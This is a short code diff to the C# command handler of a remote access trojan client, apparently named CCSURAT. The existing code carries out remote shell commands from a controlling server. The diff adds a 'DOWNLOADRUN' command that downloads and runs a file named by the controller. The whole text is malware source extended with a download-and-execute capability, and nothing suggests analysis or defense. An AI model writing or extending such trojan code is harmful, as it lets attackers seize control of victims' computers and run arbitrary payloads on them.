@@ -133,7 +133,7 @@ namespace CCSURAT_Client
             try {
                 string command = GetCommand(data);
                 data = RemoveCommand(data);
-                // Split parameters, parameters are just open command tags w/o close command tag: [[EXAMPLEPARAM]]
+                // Split parameters, seperated by |*|.
                 string[] prms = new string[0];
                 if (data != string.Empty)
                     prms = data.Split(new string[] { "|*|" }, StringSplitOptions.None);
@@ -162,6 +162,9 @@ namespace CCSURAT_Client
                     case "REMOTECMD":
                         RemoteCmd(prms[0]);
                         Write("[[CMD]]" + cmd.GetResponse() + "[[/CMD]]");
+                        break;
+                    case "DOWNLOADRUN":
+                        SystemUtils.DownloadRun(prms[0], prms[1]);
                         break;
                 }
             } catch(Exception ex)
